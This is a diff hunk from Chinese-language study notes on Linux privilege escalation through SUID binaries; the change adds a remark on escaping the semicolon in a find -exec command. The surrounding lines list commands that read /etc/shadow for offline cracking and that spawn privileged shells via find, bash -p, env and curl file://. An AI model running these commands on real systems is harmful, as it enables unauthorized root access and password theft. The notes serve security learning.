@@ -30,7 +30,7 @@ linux上有些用户有权限使用sudo执行命令
 利用方式：
 find / -perm -u=s 2> /dev/null（2表示标准错误，将错误输出到dev/null表示将错误屏蔽）  查找所有拥有s权限的命令，查看是否有利用方式（可以通过对比linux默认状态下开放s权限的命令，如果有多的，查看是否有利用方式），比如：
 cat：cat passwd和shadow文件，对shadow文件进行解密（离线爆破）
-find： find /etc/passwd（任意文件） -exec bash -p \;   直接进入bash终端
+find： find /etc/passwd（任意文件） -exec bash -p \;   （其中分号是用于bash命令的结束符，反斜线用来转义，防止分号被解释为其他）直接进入bash终端
 bash： bash -p 直接进入bash终端
 env: env bash -p 直接进入bash终端
 curl： curl file：///etc/shadow 用法和cat类似
